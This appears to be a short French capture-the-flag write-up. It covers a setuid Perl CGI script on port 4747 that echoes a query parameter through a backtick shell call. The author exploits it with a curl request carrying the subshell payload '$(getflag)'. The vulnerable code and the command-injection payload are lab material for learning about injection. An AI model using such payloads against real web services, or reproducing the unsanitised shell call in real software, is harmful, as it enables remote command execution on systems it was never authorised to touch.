Qui suis-je? Ou suis-je?
$ ls -la
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
(Un executable perl avec setuid et setgid, confirmation avec file)

$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
(Un script CGI donc servi par un serveur web sur le port 4747)

$ curl -I 192.168.1.27:4747
HTTP/1.1 200 OK
Date: Thu, 28 Nov 2019 11:04:23 GMT
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1
Content-Type: text/html
(Confirmation)

$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
// fonction qui affiche son argument via echo
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
// l'argument de la fonction x est le param nomme "x"
x(param("x"));
(Le script affiche juste la valeur du parametre "x" de la requete)

$ curl 192.168.1.27:4747?x=coucou
coucou
(Oui!)

$ curl '192.168.1.27:4747?x=$(getflag)'
Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXX
(comme le script execute une commande shell avec echo pour print, on peut injecter un subshell pour qu'il echo une commande)
